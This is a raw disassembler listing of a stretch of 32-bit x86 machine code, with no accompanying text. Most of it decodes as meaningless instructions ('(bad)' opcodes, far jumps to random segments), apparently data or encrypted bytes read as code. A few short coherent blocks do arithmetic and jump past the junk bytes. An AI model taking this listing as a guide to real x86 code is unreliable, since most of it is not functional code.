  40fcac:	test   DWORD PTR [ebp+0x603329e3],edx
  40fcb2:	iret   
  40fcb3:	mov    WORD PTR [ebx-0x6bded663],gs
  40fcb9:	jnp    0x40fc7a
  40fcbb:	(bad)  
  40fcbc:	je     0x40fc63
  40fcbe:	xor    ebx,DWORD PTR [eax]
  40fcc0:	cmp    esi,ebp
  40fcc2:	mov    dl,BYTE PTR [edx+0x79631eb3]
  40fcc8:	std    
  40fcc9:	icebp  
  40fcca:	pop    ds
  40fccb:	les    edi,FWORD PTR [ecx+0x67]
  40fcce:	outs   dx,DWORD PTR ds:[esi]
  40fccf:	jge    0x40fd08
  40fcd1:	mov    DWORD PTR [ecx+0x69b2dfa],esp
  40fcd7:	rol    DWORD PTR [edx-0x3f093040],cl
  40fcdd:	add    ch,BYTE PTR [edi+0x43]
  40fce0:	fiadd  DWORD PTR [edx+0x26]
  40fce3:	ja     0x40fd50
  40fce5:	mov    esp,ds
  40fce7:	or     al,0x73
  40fce9:	jmp    0x4aaa:0xe792c087
  40fcf0:	sahf   
  40fcf1:	(bad)  
  40fcf2:	retf   
  40fcf3:	lahf   
  40fcf4:	test   eax,0x66a334c9
  40fcf9:	cmp    eax,0xe511b89a
  40fcfe:	retf   0x3581
  40fd01:	cwde   
  40fd02:	pop    edx
  40fd03:	outs   dx,DWORD PTR ds:[esi]
  40fd04:	rcl    BYTE PTR [edx+esi*8+0x6285c6a],cl
  40fd0b:	push   ebp
  40fd0c:	mov    WORD PTR [eax+0x19a4e3c],gs
  40fd12:	test   BYTE PTR [esi+0x41f90b30],cl
  40fd18:	xchg   ebp,eax
  40fd19:	pop    esp
  40fd1a:	pushf  
  40fd1b:	and    bh,BYTE PTR [ebx+0x5640cf9d]
  40fd21:	imul   ebp,esi,0xb0606220
  40fd27:	leave  
  40fd28:	or     BYTE PTR ds:0x87160c4d,dl
  40fd2e:	adc    eax,0x378e2ef6
  40fd33:	call   0xf9a580ec
  40fd38:	popa   
  40fd39:	cmp    dh,BYTE PTR [eax+eax*1]
  40fd3c:	xor    eax,0x2cbad9cb
  40fd41:	int    0x10
  40fd43:	aaa    
  40fd44:	sub    DWORD PTR [ebx],esi
  40fd46:	test   eax,0xcad34142
  40fd4b:	mov    cl,BYTE PTR [eax-0x5]
  40fd4e:	add    DWORD PTR [edi-0x7ed4d297],edi
  40fd54:	aam    0x5d
  40fd56:	test   BYTE PTR [ecx-0x343cb1f1],cl
  40fd5c:	cmp    BYTE PTR [edi],dl
  40fd5e:	stos   BYTE PTR es:[edi],al
  40fd5f:	(bad)  
  40fd60:	xchg   esp,eax
  40fd61:	(bad)  
  40fd62:	aaa    
  40fd63:	call   0xd63c:0xc074e2ff
  40fd6a:	push   0xffffffd0
  40fd6c:	jle    0x40fcfe
  40fd6e:	inc    edi
  40fd6f:	sbb    al,0x9
  40fd71:	jb     0x40fd87
  40fd73:	push   esi
  40fd74:	(bad)
  40fd77:	cmp    BYTE PTR [edi],al
  40fd79:	addr16 int3 
  40fd7b:	push   ss
  40fd7c:	sub    esi,DWORD PTR [esi+0x63]
  40fd7f:	or     esp,DWORD PTR [eax-0x1b]
  40fd82:	xchg   DWORD PTR [edx],eax
  40fd84:	push   ecx
  40fd85:	mov    BYTE PTR [edx+edx*8-0x2b529404],ch
  40fd8c:	add    DWORD PTR [eax-0x3d],ecx
  40fd8f:	enter  0xb9db,0x53
  40fd93:	and    BYTE PTR [esi+0x570a4130],bl
  40fd99:	and    al,0xbc
  40fd9b:	ja     0x40fd34
  40fd9d:	dec    ebp
  40fd9e:	aaa    
  40fd9f:	das    
  40fda0:	inc    eax
  40fda1:	dec    ebx
  40fda2:	nop
  40fda3:	fld    st(0)
  40fda5:	push   esp
  40fda6:	fnsave [esi+0x2b]
  40fda9:	add    esp,eax
  40fdab:	sbb    al,BYTE PTR [esi]
  40fdad:	pcmpgtw mm5,mm7
  40fdb0:	out    0xa4,eax
  40fdb2:	jo     0x40fd4b
  40fdb4:	lds    edx,FWORD PTR [ebp-0xa5e4f4]
  40fdba:	outs   dx,BYTE PTR ds:[esi]
  40fdbc:	adc    ecx,DWORD PTR [ebp+eax*1+0x63f07050]
  40fdc3:	and    esi,ebx
  40fdc5:	ss fs stos BYTE PTR es:[edi],al
  40fdc8:	xor    BYTE PTR [ebx+0x7c25e96b],ah
  40fdce:	stos   BYTE PTR es:[edi],al
  40fdcf:	shl    ebx,1
  40fdd1:	dec    esp
  40fdd2:	imul   ebx,DWORD PTR ds:0xe04a226a,0x24
  40fdd9:	dec    edi
  40fdda:	cld    
  40fddb:	mov    dl,0x96
  40fddd:	dec    eax
  40fdde:	bnd call 0x1e96407
  40fde4:	xor    ebx,DWORD PTR [eax+0x49]
  40fde7:	ror    BYTE PTR [ebx],cl
  40fde9:	ror    DWORD PTR [ebx+0x4d8be04d],0xe4
  40fdf0:	and    edx,0x76f2
  40fdf6:	or     edx,edi
  40fdf8:	xor    edx,esi
  40fdfa:	xor    eax,0x253b
  40fdff:	shld   edx,eax,0x2
  40fe03:	shl    eax,0x2
  40fe06:	shr    ecx,0x1e
  40fe09:	xor    esi,esi
  40fe0b:	or     eax,ecx
  40fe0d:	or     edx,esi
  40fe0f:	xor    eax,0xcb79b576
  40fe14:	mov    DWORD PTR [ebp-0x20],eax
  40fe17:	mov    esi,0x9c2b8ae8
  40fe1c:	xor    edx,esi
  40fe1e:	mov    DWORD PTR [ebp-0x1c],edx
  40fe21:	mov    eax,DWORD PTR [ebp-0x38]
  40fe24:	mov    ecx,DWORD PTR [ebp-0x34]
  40fe27:	mov    edx,DWORD PTR [ebp-0x40]
  40fe2a:	mov    edi,DWORD PTR [ebp-0x3c]
  40fe2d:	push   edi
  40fe2e:	push   edx
  40fe2f:	push   ecx
  40fe30:	push   eax
  40fe31:	call   0x41594e
  40fe36:	add    eax,0x536a
  40fe3b:	adc    edx,0x9573
  40fe41:	push   0x12613
  40fe46:	push   0xae21daec
  40fe4b:	push   edx
  40fe4c:	push   eax
  40fe4d:	call   0x422286
  40fe52:	mov    ecx,eax
  40fe54:	mov    eax,DWORD PTR [ebp-0x20]
  40fe57:	mov    ebx,DWORD PTR [ebp-0x1c]
  40fe5a:	xor    ecx,0x1b8b
  40fe60:	xor    edi,edi
  40fe62:	xor    edx,edi
  40fe64:	add    ecx,eax
  40fe66:	mov    eax,DWORD PTR [ebp+0xc]
  40fe69:	adc    edx,ebx
  40fe6b:	mov    DWORD PTR [eax],ecx
  40fe6d:	mov    DWORD PTR [eax+0x4],edx
  40fe70:	mov    eax,DWORD PTR [ebp-0x30]
  40fe73:	mov    ecx,DWORD PTR [ebp-0x2c]
  40fe76:	mov    edx,0xbdb2
  40fe7b:	sub    edx,eax
  40fe7d:	jmp    0x410231
  40fe82:	(bad)  
  40fe83:	out    dx,eax
  40fe84:	ins    BYTE PTR es:[edi],dx
  40fe85:	and    BYTE PTR [esp+edi*4+0x3f7f08b],bh
  40fe8c:	or     bh,0xad
  40fe8f:	lods   al,BYTE PTR ds:[esi]
  40fe90:	clc    
  40fe91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe93:	sub    al,0xbe
  40fe95:	mov    esi,0xbebec4e3
  40fe9a:	push   edi
  40fe9b:	inc    ecx
  40fe9c:	lahf   
  40fe9d:	xchg   ebx,eax
  40fe9e:	pushw  es
  40fea0:	sub    al,0xe9
  40fea2:	pop    edi
  40fea3:	mov    gs,esi
  40fea5:	pop    ss
  40fea6:	jae    0x40fe4a
  40fea8:	mov    ebp,0x2018d81a
  40fead:	push   ebp
  40feae:	xor    bh,BYTE PTR [eax+0x4]
  40feb1:	push   ss
  40feb2:	cs or  al,cl
  40feb5:	es in  eax,0xbb
  40feb8:	into   
  40feb9:	in     eax,dx
  40feba:	mov    eax,ds:0xc62c2f8
  40febf:	mov    eax,ds:0x9d819f5a
  40fec4:	aad    0xd7
  40fec6:	cdq    
  40fec7:	cwde   
  40fec8:	popf   
  40fec9:	add    bl,ch
  40fecb:	xor    DWORD PTR [edi+0x3b07a3ff],edi
  40fed1:	ss and eax,0x83c27039
  40fed7:	pop    esi
  40fed8:	add    BYTE PTR ss:[ecx+esi*2-0x2f],bh
  40fedd:	inc    ebx
  40fede:	dec    ebx
  40fedf:	scas   eax,DWORD PTR es:[edi]
  40fee0:	nop
  40fee1:	mov    edx,0x5c3117d
  40fee6:	mov    dh,0xb0
  40fee8:	retf   0x5ac
  40feeb:	inc    eax
  40feec:	sbb    esi,DWORD PTR [eax]
  40feee:	loope  0x40fec2
  40fef0:	sub    bl,dh
  40fef2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fef3:	cmc    
  40fef4:	and    BYTE PTR [ecx-0x4f55749b],dh
  40fefa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fefb:	cmc    
  40fefc:	(bad)  
  40fefd:	mov    esp,0xc5fae534
  40ff02:	push   ebp
  40ff03:	in     eax,0x75
  40ff05:	xor    al,0x85
  40ff07:	mov    ds:0x396a68a6,eax
  40ff0c:	in     eax,0x8c
  40ff0e:	jae    0x40fefc
  40ff10:	xchg   edx,eax
  40ff11:	xor    al,0xee
  40ff13:	out    0x8,al
  40ff15:	shl    eax,1
  40ff17:	xchg   ebp,eax
  40ff18:	in     eax,dx
  40ff19:	ret    0x65b5
  40ff1c:	bound  ebx,QWORD PTR [edi]
  40ff1e:	push   ds
  40ff1f:	fisttp DWORD PTR [edx]
  40ff21:	mov    esi,0xea026d7b
  40ff26:	out    dx,eax
  40ff27:	test   al,0xc4
  40ff29:	scas   eax,DWORD PTR es:[edi]
  40ff2a:	into   
  40ff2b:	xchg   eax,esi
  40ff2d:	inc    esp
  40ff2e:	dec    edi
  40ff2f:	aad    0xa8
  40ff31:	add    al,bl
  40ff33:	arpl   WORD PTR [ebp-0x3b],bp
  40ff36:	repz jle 0x40ff00
  40ff39:	mov    eax,0xee4d1929
  40ff3e:	inc    esi
  40ff3f:	push   ebp
  40ff40:	xor    bh,cl
  40ff42:	cmp    DWORD PTR [ebx],edi
  40ff44:	arpl   WORD PTR [ecx+0x34566751],di
  40ff4a:	daa    
  40ff4b:	cmp    eax,0x57f2a279
  40ff50:	or     eax,0x88f76a0d
  40ff55:	dec    ecx
  40ff56:	push   0xffffffba
  40ff58:	jmp    0x1351:0xfd6d84f2
  40ff5f:	fcomp  QWORD PTR [ebx-0x72]
  40ff62:	sbb    BYTE PTR [ebx],cl
  40ff64:	xlat   BYTE PTR ds:[ebx]
  40ff65:	ret    0xa244
  40ff68:	outs   dx,BYTE PTR ds:[esi]
  40ff69:	mov    esp,0x9b56401f
  40ff6e:	pop    ebx
  40ff6f:	lahf   
  40ff70:	dec    ebx
  40ff71:	lods   eax,DWORD PTR ds:[esi]
  40ff72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff73:	outs   dx,BYTE PTR ds:[esi]
  40ff74:	pusha  
  40ff75:	psrld  mm4,mm1
  40ff78:	into   
  40ff79:	or     al,0xce
  40ff7b:	and    esp,edi
  40ff7d:	sbb    DWORD PTR [eax],eax
  40ff7f:	cld    
  40ff80:	dec    ecx
  40ff81:	sbb    ch,BYTE PTR ds:0x1dc87833
  40ff87:	add    BYTE PTR [edx-0x5bc412ce],ch
  40ff8d:	mov    dh,0x28
  40ff8f:	adc    DWORD PTR [edx+0x4d064d81],esp
  40ff95:	inc    esp
  40ff96:	leave  
  40ff97:	(bad)  
  40ff98:	jg     0x40ff67
  40ff9a:	in     eax,0x38
  40ff9c:	jbe    0x40ffe5
  40ff9e:	std    
  40ff9f:	fsubr  QWORD PTR [esi]
  40ffa1:	out    dx,al
  40ffa2:	inc    esi
  40ffa3:	and    bl,dl
  40ffa5:	sti    
  40ffa6:	hlt    
  40ffa7:	ror    edx,0xb5
  40ffaa:	popa   
  40ffab:	mov    ebx,0xbc1ab0c6
  40ffb0:	jge    0x40ffa3
  40ffb2:	mul    BYTE PTR [eax+0x40]
  40ffb5:	aad    0xe2
  40ffb7:	enter  0x8c4a,0xfe
  40ffbb:	push   ecx
  40ffbc:	mov    bh,0xea
  40ffbe:	scas   eax,DWORD PTR es:[edi]
  40ffbf:	mov    WORD PTR [eax+0x5adb7d30],?
  40ffc5:	arpl   WORD PTR ds:0xa4f1df32,dx
  40ffcb:	call   0xd863b61f
  40ffd0:	int3   
  40ffd1:	pop    ds
  40ffd2:	add    eax,0x3c71b373
  40ffd7:	sub    al,0x2d
  40ffd9:	sbb    eax,0x1b029686
  40ffde:	call   0x8df:0x38d6fa97
  40ffe5:	lds    ecx,FWORD PTR [edi]
  40ffe7:	and    al,0x7f
  40ffe9:	stos   DWORD PTR es:[edi],eax
  40ffea:	in     al,dx
  40ffeb:	(bad)  
  40ffec:	push   ebp
  40ffed:	mov    eax,ds:0x790838a2
  40fff2:	mov    cl,0x3
  40fff4:	imul   esp,DWORD PTR [esi+0x41b0762d],0x90691227
  40fffe:	popf   
  40ffff:	cmc    
  410000:	imul   edi,DWORD PTR [edi],0x21
  410003:	pop    ebp
  410004:	je     0x40ff90
  410006:	clc    
  410007:	lds    esp,FWORD PTR [ebx-0x35]
  41000a:	lods   eax,DWORD PTR ds:[esi]
  41000b:	je     0x40ff99
  41000d:	inc    ebx
  41000e:	ror    DWORD PTR [ebp+0x2d11dc42],0xf
  410015:	ins    DWORD PTR es:[di],dx
  410017:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410018:	mov    al,0x2f
  41001a:	sub    dh,0x6f
  41001d:	or     eax,0xf10e1607
  410022:	call   0x7ff2:0xc0b9107e
  410029:	(bad)  
  41002d:	push   esi
  41002e:	das    
  41002f:	xchg   edx,ebx
  410031:	push   ecx
  410032:	ja     0x410079
  410034:	cmp    BYTE PTR [ebx-0x14],ah
  410037:	xchg   esi,eax
  410038:	or     eax,0x80469efc
  41003d:	adc    eax,0xd9a2d8ad
  410042:	mov    esp,eax
  410044:	push   0x2f90853c
  410049:	repnz inc ebx
  41004b:	sbb    eax,0xf5dc13d1
  410050:	rcl    DWORD PTR [ecx-0x79],cl
  410053:	ss out dx,eax
  410055:	sbb    al,0xdb
  410057:	dec    eax
  410058:	iret   
  410059:	adc    BYTE PTR [ebp-0x5c],cl
  41005c:	pushf  
  41005d:	xchg   esp,eax
  41005e:	push   ds
  41005f:	inc    edx
  410060:	push   edi
  410061:	rcr    BYTE PTR [edi-0x65cd9f96],cl
  410067:	mov    ebp,0xedffe0a4
  41006c:	and    ecx,DWORD PTR [eax]
  41006e:	mov    edx,0x381be477
  410073:	(bad)  
  410074:	mov    ebx,0xa5bfcc1c
  410079:	sahf   
  41007a:	push   ds
  41007b:	outs   dx,DWORD PTR ds:[esi]
  41007c:	shl    DWORD PTR [esi+0x42895180],0xd9
  410083:	data16 hlt 
  410085:	adc    al,0xdc
  410087:	inc    ebx
  410088:	or     dl,cl
  41008a:	add    bh,ah
  41008c:	add    DWORD PTR [edi],0xffffffc8
  41008f:	pop    ecx
  410090:	or     DWORD PTR [ecx+ebp*4],0x477fde38
  410097:	jo     0x410094
  410099:	xor    al,0xb1
  41009b:	jmp    0xa13d7c7c
  4100a0:	retf   0x3b5a
  4100a3:	cdq    
  4100a4:	in     al,0x8e
  4100a6:	cmp    BYTE PTR [ebp-0x63],dl
  4100a9:	dec    esp
  4100aa:	dec    esp
  4100ab:	cmp    DWORD PTR ds:0xb8e38a51,ecx
  4100b1:	mov    ebp,0x1ccaa484
  4100b6:	fild   DWORD PTR [edx-0x551e6c57]
  4100bc:	sbb    al,0x8e
  4100be:	jecxz  0x4100ac
  4100c0:	dec    ecx
  4100c1:	xor    DWORD PTR es:[eax-0x3b0d9183],ebx
  4100c8:	mov    WORD PTR [ebp-0x631783e],ss
  4100ce:	xchg   ebx,eax
  4100cf:	xor    ebp,ebx
  4100d1:	adc    ch,BYTE PTR [ebx+0x505bd793]
  4100d7:	cmp    ecx,DWORD PTR [ebx]
  4100d9:	iret   
  4100da:	int    0x18
  4100dc:	adc    DWORD PTR [edx],0xd8f4b3f9
  4100e2:	add    ecx,DWORD PTR [ecx]
  4100e4:	jle    0x410122
  4100e6:	sar    DWORD PTR [edi+ebx*2-0x138e856e],cl
  4100ed:	push   edx
  4100ee:	pop    ebx
  4100ef:	les    eax,FWORD PTR [edx]
  4100f1:	lock jno 0x41007f
  4100f4:	jp     0x4100e3
  4100f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100f7:	xlat   BYTE PTR ds:[ebx]
  4100f8:	lods   eax,DWORD PTR ds:[esi]
  4100f9:	mov    al,ds:0xfe4b870b
  4100fe:	into   
  4100ff:	sbb    eax,0x57cbc5c1
  410104:	(bad)  
  410105:	sub    ecx,ecx
  410107:	mov    eax,0xd200bbc8
  41010c:	push   ebx
  41010d:	xchg   esi,eax
  41010e:	lea    ebx,[eax]
  410110:	cdq    
  410111:	push   esi
  410112:	cs jae 0x41017c
  410115:	sub    esi,DWORD PTR [ecx]
  410117:	(bad)  
  410118:	in     eax,0x54
  41011a:	xor    al,0x5d
  41011c:	fstp   QWORD PTR [edi]
  41011e:	out    0x5a,al
  410120:	into   
  410121:	ror    BYTE PTR [ecx+0x228ab755],1
  410127:	test   eax,0xbc7fd5a5
  41012c:	xchg   ecx,eax
  41012d:	lahf   
  41012e:	add    eax,0x866f9033
  410133:	cmp    DWORD PTR [ecx+0x47],edx
  410136:	jge    0x41011b
  410138:	lods   eax,DWORD PTR ds:[esi]
  410139:	pop    esp
  41013a:	hlt    
  41013b:	pop    ebx
  41013c:	fsubr  st(4),st
  41013e:	sbb    eax,0x42d3aa42
  410143:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410144:	inc    esi
  410145:	and    ebx,DWORD PTR [ecx+0x3c]
  410148:	sub    DWORD PTR [ebx],ebp
  41014a:	add    ch,BYTE PTR [esp+eax*4+0x5d]
  41014e:	daa    
  41014f:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410151:	sub    dl,BYTE PTR [edi+0x47]
  410154:	fcom   QWORD PTR [ecx-0x4a]
  410157:	mov    BYTE PTR [ebp-0x5e],bh
  41015a:	inc    esp
  41015b:	inc    ebp
  41015c:	dec    ebx
  41015d:	jecxz  0x4101bc
  41015f:	loope  0x4101b0
  410161:	in     eax,dx
  410162:	mov    ch,0x8a
  410164:	out    dx,eax
  410165:	int3   
  410166:	xlat   BYTE PTR ds:[ebx]
  410167:	into   
  410168:	add    BYTE PTR [edx+0x1eb6558c],dl
  41016e:	xchg   BYTE PTR [ecx+ebx*1],dl
  410171:	jb     0x4101b6
  410173:	(bad)  [ebx-0x5743fe0b]
  410179:	inc    ecx
  41017a:	enter  0xa7b2,0x43
  41017e:	pop    ss
  41017f:	mov    eax,DWORD PTR [esp+ebp*2+0x55]
  410183:	jmp    DWORD PTR [ebx+0x1f]
  410186:	test   BYTE PTR [ebx],cl
  410188:	test   al,0xcf
  41018a:	idiv   BYTE PTR [ebp+0x121974c6]
  410190:	jle    0x410202
  410192:	loopne 0x410192
  410194:	pop    ss
  410195:	push   ebx
  410196:	xchg   BYTE PTR [edx],dh
  410198:	xchg   edx,eax
  410199:	xchg   ecx,eax
  41019a:	mov    ebx,0x295edc05
  41019f:	push   0x2
  4101a1:	fs addr16 jnp 0x41012b
  4101a5:	xor    BYTE PTR [edi+0x2],dh
  4101a8:	mov    dh,0x37
  4101aa:	pop    ds
  4101ab:	(bad)  
  4101ac:	scas   al,BYTE PTR es:[edi]
  4101ad:	in     eax,0x12
  4101af:	jmp    0x48f19b24
  4101b4:	cld    
  4101b5:	sub    eax,0x4174449f
  4101ba:	xor    BYTE PTR [edx+eiz*4],bl
  4101bd:	scas   eax,DWORD PTR es:[edi]
  4101be:	imul   DWORD PTR [edi+0x6dd9a541]
  4101c4:	lock sub BYTE PTR [bp+di],0x27
  4101c9:	fistp  QWORD PTR [ebp+eiz*1+0x75b90747]
  4101d0:	fist   DWORD PTR [ecx]
  4101d2:	lods   eax,DWORD PTR ds:[esi]
  4101d3:	jnp    0x410240
  4101d5:	sub    BYTE PTR [esi],bh
  4101d7:	sub    BYTE PTR [esi-0x4f],dh
  4101da:	les    ebx,FWORD PTR [edi+0x2def9846]
  4101e0:	retf   0xb7f7
  4101e3:	mov    al,ds:0x71a245d8
  4101e8:	scas   al,BYTE PTR es:[edi]
  4101e9:	arpl   WORD PTR [ebx+0x7e],cx
  4101ec:	cwde   
  4101ed:	aad    0xfc
  4101ef:	shl    DWORD PTR [eax-0x5f95d533],1
  4101f5:	dec    esp
  4101f6:	jecxz  0x410242
  4101f8:	ja     0x41026c
  4101fa:	or     ebp,DWORD PTR [ebp+esi*1+0x2d]
  4101fe:	and    esp,DWORD PTR [ebx-0x73e68a41]
  410204:	add    DWORD PTR [edi],edx
  410206:	cmp    al,0x43
  410208:	xor    eax,0xe570040e
  41020d:	inc    esp
  41020e:	call   0xdc02:0x53068abc
  410215:	je     0x410219
  410217:	aad    0x56
  410219:	mov    esi,0x8dd62816
  41021e:	retf   
  41021f:	inc    ecx
  410220:	adc    al,0x3f
  410222:	loopne 0x41028c
  410224:	call   0xc61c6be3
  410229:	pop    es
  41022a:	push   esp
  41022b:	sbb    BYTE PTR [edx+0x35735030],al
  410231:	mov    eax,DWORD PTR [ebp-0x28]
  410234:	mov    ebx,0x4c02
  410239:	sbb    ebx,ecx
  41023b:	mov    ecx,DWORD PTR [ebp-0x24]
  41023e:	sub    edx,eax
  410240:	mov    eax,DWORD PTR [ebp+0xc]
  410243:	sbb    ebx,ecx
  410245:	add    edx,DWORD PTR [eax]
  410247:	mov    ecx,DWORD PTR [ebp-0x28]
  41024a:	adc    ebx,DWORD PTR [eax+0x4]
  41024d:	push   0x2
  41024f:	xor    ebx,esi
  410251:	mov    esi,DWORD PTR [ebp-0x24]
  410254:	pop    esi
  410255:	sub    esi,ecx
  410257:	mov    ecx,DWORD PTR [ebp-0x30]
  41025a:	sub    esi,ecx
  41025c:	mov    eax,ebx
  41025e:	jmp    0x410612
  410263:	sub    DWORD PTR [esi-0x65853526],eax
  410269:	cmp    DWORD PTR [esi-0x6df308e8],esp
  41026f:	sbb    eax,0xc990dfa5
  410274:	xor    al,0xbe
  410276:	mov    esi,0xbebec4e3
  41027b:	xchg   edi,eax
  41027c:	pop    ebx
  41027d:	inc    ebx
  41027e:	les    ecx,FWORD PTR [edi+0x59]
  410281:	push   ss
  410282:	(bad)  
  410284:	jae    0x41027e
  410286:	push   ebx
  410287:	sub    bh,ah
  410289:	cmp    ch,bl
  41028b:	jle    0x41029e
  41028d:	xor    al,0xe0
  41028f:	mov    esp,0xef8941c3
  410294:	xchg   BYTE PTR [eax-0x6a90b714],ah
  41029a:	add    edx,DWORD PTR ds:0xee047f6c
  4102a0:	lahf   
  4102a1:	sbb    DWORD PTR [edi-0x3dbb29bb],ecx
  4102a7:	or     bh,BYTE PTR [ecx+0x61]
  4102aa:	shl    DWORD PTR [ebx+ebp*1-0x5599f0c],cl
  4102b1:	xchg   BYTE PTR [ecx],bh
  4102b3:	cs push 0x36379305
  4102b9:	and    al,0x95
  4102bb:	in     al,dx
  4102bc:	test   BYTE PTR [edi],ah
  4102be:	sahf   
  4102bf:	aam    0xa5
  4102c1:	fdivr  QWORD PTR ss:[ebx]
  4102c4:	push   es
  4102c5:	popf   
  4102c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102c7:	jmp    0x41032e
  4102c9:	loope  0x41025f
  4102cb:	pop    eax
  4102cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102cd:	mov    fs,edx
  4102cf:	ficom  DWORD PTR [esi+esi*1-0x8e0cc69]
  4102d6:	call   0x4073:0xb8eef199
  4102dd:	cmp    al,0xdc
  4102df:	dec    ecx
  4102e0:	jmp    0xb68e1f65
  4102e5:	push   0x62
  4102e7:	push   edx
  4102e8:	retf   
  4102e9:	adc    BYTE PTR [edx-0x8],ch
  4102ec:	out    dx,al
  4102ed:	pop    eax
  4102ee:	mov    eax,ds:0x1e843a0b
  4102f3:	jns    0x4102d7
  4102f5:	lea    edx,[esi-0x18]
  4102f8:	mov    al,ds:0x9e7dd6d1
  4102fd:	and    cl,BYTE PTR [eax]
  4102ff:	aaa    
  410300:	xchg   ecx,eax
  410301:	adc    ecx,DWORD PTR [ecx]
  410303:	outs   dx,DWORD PTR ds:[esi]
  410304:	arpl   WORD PTR [edi+0x3d407777],di
  41030a:	ja     0x41029e
  41030c:	sub    cl,dl
  41030e:	shl    dh,cl
  410310:	cwde   
  410311:	cmc    
  410312:	mov    bl,0x38
  410314:	scas   eax,DWORD PTR es:[edi]
  410315:	inc    edi
  410316:	jp     0x410355
  410318:	loope  0x410393
  41031a:	inc    esp
  41031b:	mov    BYTE PTR [ecx-0x3761e95a],bh
  410321:	mov    bl,0x38
  410323:	inc    edi
  410324:	inc    eax
  410325:	or     BYTE PTR [edi-0xb],ch
  410328:	sbb    BYTE PTR [eax],cl
  41032a:	nop
  41032b:	int3   
  41032c:	mov    bl,BYTE PTR [eax-0x4e836449]
  410332:	pop    ebp
  410333:	loopne 0x41033c
  410335:	sahf   
  410336:	xor    ecx,ebp
  410338:	push   0xffffff90
  41033a:	(bad)  
  41033c:	xor    al,0x99
  41033e:	mov    eax,ds:0x7b5c2036
  410343:	repnz mov edx,0x78873275
  410349:	and    ch,cl
  41034b:	lahf   
  41034c:	js     0x410319
  41034e:	es sahf 
  410350:	dec    ebp
  410351:	cs dec eax
  410353:	adc    eax,0x40622ec1
  410358:	or     al,BYTE PTR [ebp+0x111b826c]
  41035e:	stos   DWORD PTR es:[edi],eax
  41035f:	jae    0x4103be
  410361:	mov    bh,0x7f
  410363:	add    bh,BYTE PTR [ecx+0x34edcd6]
  410369:	in     eax,0x75
  41036b:	sub    DWORD PTR [eax],esi
  41036d:	cdq    
  41036e:	push   ecx
  41036f:	jb     0x41037d
  410371:	xor    DWORD PTR [ebx],ecx
  410373:	add    eax,0x7a26e619
  410378:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410379:	imul   ebp,DWORD PTR gs:[esi],0xffffffa1
  41037d:	jmp    0xe5aa79d6
  410382:	fwait
  410383:	js     0x41037e
  410385:	fucomi st,st(1)
  410387:	xchg   edx,eax
  410388:	or     DWORD PTR [esi+0x3d],esp
  41038b:	mov    DWORD PTR [ebx],ecx
  41038d:	call   0xa951:0xdfb03121
  410394:	mov    ss,edx
  410396:	cmp    BYTE PTR [ebx+0x8],cl
  410399:	sub    eax,0xd7e04f20
  41039e:	mov    eax,edx
  4103a0:	imul   bh
  4103a2:	push   ecx
  4103a3:	mov    eax,ds:0x9c925982
  4103a8:	jl     0x4103fb
  4103aa:	imul   BYTE PTR [edx]
  4103ac:	stos   BYTE PTR es:[edi],al
  4103ad:	and    BYTE PTR [esi],al
  4103af:	out    dx,al
  4103b0:	xor    esi,edx
  4103b2:	add    DWORD PTR [ecx+0x52b371db],0x5d
  4103b9:	frstor [edx-0x539d7392]
  4103bf:	(bad)  
  4103c0:	lahf   
  4103c1:	mov    dh,0xca
  4103c3:	sub    BYTE PTR [ebx-0x2d],cl
  4103c6:	and    DWORD PTR [ebp-0x4d06c91c],ecx
  4103cc:	loope  0x410437
  4103ce:	add    ch,dh
  4103d0:	shl    BYTE PTR [edx+0x46],0xd8
  4103d4:	(bad)  
  4103d5:	jb     0x410435
  4103d7:	(bad)  
  4103d8:	shr    ecx,cl
  4103da:	clc    
  4103db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103dc:	sub    al,0x54
  4103de:	add    dh,bl
  4103e0:	jae    0x4103ae
  4103e2:	inc    ebx
  4103e3:	jl     0x410407
  4103e5:	cli    
  4103e6:	sub    dh,BYTE PTR [edi+0x42]
  4103e9:	add    BYTE PTR [ebx+0x37],al
  4103ec:	adc    cl,BYTE PTR [edx-0x7d]
  4103ef:	cld    
  4103f0:	sbb    eax,DWORD PTR [esi-0x70]
  4103f3:	in     eax,0x9c
  4103f5:	int3   
  4103f6:	xor    DWORD PTR [ebp+esi*8-0x5f2fa994],eax
  4103fd:	repz int 0x98
  410400:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410401:	scas   al,BYTE PTR es:[edi]
  410402:	test   esi,esp
  410404:	jmp    0xe4fc:0xcd8617b8
  41040b:	popa   
  41040c:	cmp    eax,esi
  41040e:	sbb    cl,BYTE PTR [edx+0x528271d5]
  410414:	out    0xbf,al
  410416:	xor    DWORD PTR [edx-0x3a2f5208],eax
  41041c:	cmp    BYTE PTR [esi+0x4f],0x12
  410420:	mov    al,ds:0xf7d1ec5c
  410425:	repz gs pop ebp
  410428:	adc    eax,0xa984c2c3
  41042d:	mov    eax,ds:0xb9790d56
  410432:	mov    ds:0x6e984bc2,eax
  410437:	shr    BYTE PTR [edi-0x11951c43],0x94
  41043e:	xchg   esp,esp
  410440:	in     eax,0xcb
  410442:	pushf  
  410443:	les    esi,FWORD PTR ds:0x563737b3
  410449:	mov    es,esi
  41044b:	lods   al,BYTE PTR ds:[esi]
  41044c:	ds fwait
  41044e:	push   0xc8a72975
  410453:	imul   ebp,esi,0x1a5d3a18
  410459:	in     al,0x18
  41045b:	cmp    al,0x40
  41045d:	cmp    ebx,edi
  41045f:	or     eax,DWORD PTR [ecx-0x49]
  410462:	in     eax,dx
  410463:	sub    eax,0x2625511b
  410468:	ret    0x653a
  41046b:	popa   
  41046c:	fwait
  41046d:	aam    0xe2
  41046f:	inc    ecx
  410470:	addr16 cmp bh,ch
  410473:	fist   DWORD PTR [edx-0x5bb8fe06]
  410479:	ret    0x2f84
  41047c:	out    0x38,eax
